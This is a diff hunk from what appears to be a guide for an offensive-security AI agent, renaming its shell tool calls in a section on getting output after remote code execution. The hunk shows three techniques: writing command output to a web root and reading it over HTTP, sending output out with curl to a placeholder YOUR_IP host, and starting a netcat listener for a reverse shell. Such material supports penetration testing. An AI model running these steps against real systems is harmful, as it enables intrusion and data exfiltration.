@@ -205,12 +205,12 @@ When you have RCE but can't get interactive shell, use **file-write webshell** a
 ```bash
 # Option 1: Write output to web-accessible directory (RECOMMENDED)
 # Run command, write output to file readable via HTTP
-execute_command("python3 exploit.py -c 'id > /var/www/html/out.txt'")
+generic_linux_command("python3 exploit.py -c 'id > /var/www/html/out.txt'")
 # Then read the output
-execute_command("curl -s http://target/out.txt")
+generic_linux_command("curl -s http://target/out.txt")
 
 # Option 2: Use curl/wget to exfiltrate (if outbound allowed)
-execute_command("python3 exploit.py -c 'id | curl http://YOUR_IP:8000/$(cat)'")
+generic_linux_command("python3 exploit.py -c 'id | curl http://YOUR_IP:8000/$(cat)'")
 
 # Option 3: Interactive session (for real reverse shells)
 execute_command("nc -lvnp 9001", interactive=True)  # Creates session
